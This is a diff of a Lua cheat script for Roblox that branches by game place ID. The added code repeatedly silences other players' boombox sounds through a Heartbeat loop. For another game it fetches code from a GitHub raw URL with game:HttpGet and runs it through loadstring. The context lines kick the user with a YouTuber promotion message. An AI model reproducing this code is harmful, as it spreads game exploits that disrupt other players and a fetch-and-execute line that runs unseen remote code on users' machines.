@@ -105,4 +105,28 @@ game.Players.LocalPlayer:Kick("Hi cutie subscribing to srivathsanYTuber = PRO yk
 wait(5)
 	game:GetService("TeleportService"):Teleport(6875469709, game.Players.LocalPlayer)
 	end
+	elseif game.PlaceId == 2788229376 then
+	for i, v in pairs(game:GetService'Players':GetChildren()) do
+if v and v.Character then
+local character = v.Character.name
+
+   getgenv().Toggled = true
+   
+   local Player = character
+   
+   local Players = game:GetService('Players')
+   local RunService = game:GetService('RunService')
+   
+   RunService.Heartbeat:Connect(function()
+       if Toggled then
+           pcall(function()
+               Players[Player].Character.LowerTorso:FindFirstChild('BOOMBOXSOUND').Playing = false
+               Players[Player].Character.LowerTorso:FindFirstChild('BOOMBOXSOUND').TimePosition = 0
+           end)
+       end
+   end)
+end
+end
+elseif game.PlaceId == 606849621 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))();
 end
